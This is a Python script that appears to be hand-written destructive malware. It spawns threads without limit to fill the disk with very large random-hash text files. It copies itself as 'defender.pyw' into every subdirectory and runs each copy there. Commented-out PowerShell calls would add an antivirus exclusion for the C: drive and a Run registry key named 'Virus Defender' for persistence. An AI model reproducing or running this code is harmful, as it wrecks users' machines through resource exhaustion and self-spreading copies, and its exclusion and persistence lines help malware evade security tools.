
import random
import threading
import shutil
import hashlib
import os
import subprocess
import sys


def gooseChase():
    global l
    global s
    global r
    
    l = []

    for r in range(1,257):
        r = random.randint(1,9)
        l.append(r)
  
    s = ''

    for y in l:
        s += str(y)
    
    hsh = hashlib.sha512(s.encode()).hexdigest()
    
    return hsh


q = str(random.randint(1,1000000))
    
def stillBad():
    t = str(random.randint(1,1000000))
    f = open('{}.txt'.format(t), '+w')
    f.write(gooseChase() * 1000000)
    
    
def alsoBad():
    while True:
        bad = threading.Thread(target=stillBad, name='t{}'.format(q))
        bad.start()
        
        
def veryBad():
    root = os.getcwd()
    dirs = os.listdir(root)
    for z in dirs:
        shutil.copy2(r'defender.pyw', os.path.abspath(z)) 
        os.system(str(z + '\\defender.pyw')) 

        
# def winReg():
    # try:
        # subprocess.Popen([r'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe', 'Start-Process powershell -Verb runAs \'Add-MpPreference -ExclusionPath "C:\"\''], stdout=sys.stdout) 
    # except:
        # pass
    
    # subprocess.Popen([r'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe', 'Start-Process powershell -Verb runAs \'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Virus Defender" /t REG_SZ /F /D "C:\\defender.exe"\''], stdout=sys.stdout)
             
# winReg()
  
x1 = threading.Thread(target=veryBad, name='x1') 
x2 = threading.Thread(target=alsoBad, name='x2')

x1.start()
while True:
    x2.start()





